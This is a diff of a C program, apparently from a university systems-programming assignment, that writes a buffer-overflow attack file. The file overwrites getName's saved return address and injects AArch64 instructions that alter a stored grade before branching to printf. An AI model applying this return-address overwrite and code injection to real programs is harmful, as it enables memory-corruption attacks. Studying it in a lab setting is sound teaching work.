@@ -20,6 +20,9 @@ int main(void){
 
    /* Writes the new x30 for getName to skip to our assembly */
    pAAttack = 0x420058;
+
+   /* Changes to be pointing to mov instead of name */
+   pAAttack = pAAttack + 8;
    
    /* Writes the student's names */
    ulData = 0x00006E655678614D;
@@ -30,7 +33,7 @@ int main(void){
    fwrite(&ulInstruction, sizeof(unsigned int), 1, psFile);
 
    /* adr x1, grade */
-   ulInstruction = MiniAssembler_adr(1, 0x420044, pAAttack + 8 + 4);
+   ulInstruction = MiniAssembler_adr(1, 0x420044, pAAttack + 4);
    fwrite(&ulInstruction, sizeof(unsigned int), 1, psFile);
 
    /* strb wo, [x1] */
@@ -38,7 +41,7 @@ int main(void){
    fwrite(&ulInstruction, sizeof(unsigned int), 1, psFile);
 
    /* b  printf     */
-   ulInstruction = MiniAssembler_b(0x40089c, pAAttack + 8 + 12);
+   ulInstruction = MiniAssembler_b(0x40089c, pAAttack + 12);
    fwrite(&ulInstruction, sizeof(unsigned int), 1, psFile);
 
 
@@ -46,7 +49,7 @@ int main(void){
    for (i = 0; i < 24; i++)
       putc(0x00, psFile); /* Writes '00000000' */
 
-   pAAttack = pAAttack + 8;
+   
    fwrite(&pAAttack, sizeof(unsigned long), 1, psFile);
 
    fclose(psFile);
